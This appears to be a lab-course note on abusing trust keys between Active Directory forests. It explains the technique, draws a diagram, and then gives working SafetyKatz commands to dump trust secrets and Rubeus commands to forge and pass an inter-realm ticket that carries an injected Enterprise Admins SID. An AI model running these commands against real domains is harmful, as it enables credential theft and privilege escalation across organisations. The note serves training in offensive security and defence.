
The core principle of this attack is the exploitation of the **Explicit Trust** established between two separate Active Directory Forests. When a trust is formed, a shared secret (the **Trust Key**) is created so that the Domain Controller (DC) in one forest can vouch for users when they request resources in the other forest.

### **Working Principle**

The attack operates by simulating the legitimate "referral" process that occurs during cross-forest authentication:

- **Trust Secret Extraction**: The attacker must first gain administrative control over the source forest (Forest 1) to extract the **AES key or NTLM hash** of the inter-realm trust account.
- **Ticket Forgery**: Using the stolen trust secret, the attacker forges an **Inter-realm TGT** (also called a referral ticket). This ticket acts as a "recommendation letter" from Forest 1 to Forest 2.
- **Referral Presentation**: The attacker (Client) presents this forged TGT to the **Forest 2 DC**. Because the ticket is signed with the correct Trust Key, the Forest 2 DC accepts it as valid.
- **Service Ticket Issuance**: The Forest 2 DC validates the inter-realm TGT and issues a **Service Ticket (ST)** for the specific target, such as an Application Server.    
- **Access and Authentication**: The client presents the ST to the **Application Server** to gain access. Optionally, mutual authentication can occur to finalize the connection.

## Diagram

```
FOREST 1 (Source)             TRUST BOUNDARY             FOREST 2 (Target)
   =======================          [ Explicit ]          =======================
   [   Domain  1  DC     ] <--------(  Trust   )--------> [   Domain  2  DC     ]
   =======================          [  Secret  ]          =======================
              ^                                                      ^
              |                                                      |
      (1) Attacker steals                                    (3) Forged TGT is 
          Trust Key Secret                                       validated by
          from Source DC                                         Target KDC
              |                                                      |
              v                                                      v
      [    CLIENT     ] ----------------(2)----------------> [   TARGET APP    ]
      [  (Attacker)   ]        Forged TGT allows for         [     SERVER      ]
                               Service Ticket (ST) access
```


### **Security Constraints**

- **SID Filtering**: Unlike internal (Child-Parent) trusts, external trusts usually have **SID Filtering** enabled. This prevents an attacker from simply injecting "Enterprise Admin" SIDs into the ticket, meaning the attack is typically used for targeted resource access rather than immediate forest-wide takeover.
- **Trust Direction**: This principle only works in the direction of the trust (e.g., if Forest 2 trusts Forest 1, users from Forest 1 can access Forest 2).

--- 

We require the trust key for the inter-forest trust from the DC that has
the external trust:

```
SafetyKatz.exe -Command '"lsadump::trust /patch"'
```

```
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```

* Forge an inter-realm TGT using Rubeus :
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
/rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

* Use the forged ticket :
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
```

